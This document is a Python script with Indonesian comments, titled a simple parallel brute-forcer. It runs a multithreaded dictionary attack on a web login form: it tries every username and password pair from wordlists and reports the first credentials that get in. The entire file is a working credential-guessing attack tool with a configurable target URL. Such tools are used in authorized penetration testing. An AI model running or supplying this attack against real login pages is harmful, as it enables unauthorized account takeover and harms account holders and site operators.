import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import time
import threading

# Banner untuk ditampilkan saat program dijalankan
BANNER = """
 ____        _     _           _
|  _ \ _   _| |__ | |_   _ ___| |_
| |_) | | | | '_ \| | | | / __| __|
|  __/| |_| | |_) | | |_| \__ \ |_
|_|    \__,_|_.__/|_|\__,_|___/\__|
A Simple Python Parallel Brute-Forcer
"""

# Event untuk memberi sinyal ke semua thread agar berhenti
stop_event = threading.Event()
# Lock untuk mencegah race condition saat mencetak hasil
found_lock = threading.Lock()

def attempt_login(session, url, username, password, username_field, password_field, fail_string):
    """
    Mencoba untuk login dengan satu kombinasi username dan password.
    Menggunakan objek session untuk efisiensi koneksi.
    """
    # Jangan mulai request baru jika sudah ada yang berhasil
    if stop_event.is_set():
        return None

    try:
        payload = {
            username_field: username,
            password_field: password
        }
        # Menggunakan session yang sudah ada untuk mengirim POST request
        response = session.post(url, data=payload, allow_redirects=True, timeout=5)

        if fail_string not in response.text:
            return (username, password)
        return None
    except requests.exceptions.RequestException:
        return None

def worker(task_queue, url, username_field, password_field, fail_string, progress_bar):
    """
    Fungsi worker yang akan dijalankan oleh setiap thread.
    Setiap worker memiliki session-nya sendiri.
    """
    # Setiap thread mendapatkan session-nya sendiri untuk koneksi yang lebih efisien
    with requests.Session() as session:
        while not task_queue.empty() and not stop_event.is_set():
            try:
                username, password = task_queue.get_nowait()
            except Queue.Empty:
                continue

            result = attempt_login(session, url, username, password, username_field, password_field, fail_string)

            # Jika kredensial ditemukan
            if result:
                # Gunakan lock untuk memastikan hanya satu thread yang bisa mengklaim keberhasilan
                with found_lock:
                    # Periksa lagi untuk memastikan belum ada thread lain yang berhasil lebih dulu
                    if not stop_event.is_set():
                        stop_event.set()  # Beri sinyal ke semua thread untuk berhenti
                        return result # Kembalikan kredensial yang berhasil

            task_queue.task_done()
            if not stop_event.is_set():
                progress_bar.update()

    return None

def display_progress(total, unit_text):
    """Sebuah 'progress bar' untuk menunjukkan kemajuan."""
    try:
        from tqdm import tqdm
        return tqdm(total=total, unit=f" {unit_text}", desc="Mencoba", ncols=100, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]')
    except ImportError:
        print("[-] Peringatan: Pustaka 'tqdm' tidak ditemukan. Progress bar tidak akan ditampilkan.")
        print("[-] Silakan instal dengan: pip install tqdm")
        # Fallback jika tqdm tidak ada
        class DummyProgressBar:
            def update(self, n=1): pass
            def close(self): pass
        return DummyProgressBar()


if __name__ == '__main__':
    print(BANNER)

    # --- Start: Configuration within the notebook ---
    # Define your configuration here directly
    url = "YOUR_LOGIN_URL" # Replace with the target login URL
    userlist_path = "usernames.txt" # Replace with the path to your username wordlist file
    passlist_path = "password-list.txt" # Replace with the path to your password wordlist file
    threads = 10 # Number of parallel threads
    username_field = "username" # Name of the username field in the form
    password_field = "password" # Name of the password field in the form
    fail_string = "Invalid credentials" # String indicating login failure

    # --- End: Configuration within the notebook ---

    # Membaca wordlist
    try:
        with open(userlist_path, 'r', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: File userlist tidak ditemukan di '{userlist_path}'")
        sys.exit(1)

    try:
        with open(passlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: File passlist tidak ditemukan di '{passlist_path}'")
        sys.exit(1)

    # Membuat antrian tugas
    task_queue = Queue()
    for user in usernames:
        for password in passwords:
            task_queue.put((user, password))

    total_attempts = task_queue.qsize()
    if total_attempts == 0:
        print("[-] Error: Userlist atau passlist kosong.")
        sys.exit(1)

    progress_bar = display_progress(total_attempts, "kombinasi")

    found_credentials = None
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, task_queue, url, username_field, password_field, fail_string, progress_bar) for _ in range(min(threads, total_attempts))]

        for future in as_completed(futures):
            result = future.result()
            if result:
                found_credentials = result
                # Setelah hasil pertama ditemukan, tidak perlu menunggu future lain
                # Executor akan ditutup secara otomatis setelah semua thread berhenti
                # karena `stop_event` sudah di-set.
                break

    # Memberi waktu bagi pesan terakhir dari progress bar untuk dicetak
    time.sleep(0.1)
    progress_bar.close()

    end_time = time.time()

    print("\n" + "="*50)
    if found_credentials:
        user, pwd = found_credentials
        print(f"[*] Kredensial berhasil ditemukan!")
        print(f"    -> Username: {user}")
        print(f"    -> Password: {pwd}")
    else:
        print("[*] Kredensial tidak ditemukan dalam kombinasi wordlist ini.")

    print(f"[*] Waktu yang dibutuhkan: {end_time - start_time:.2f} detik")
    print("="*50)
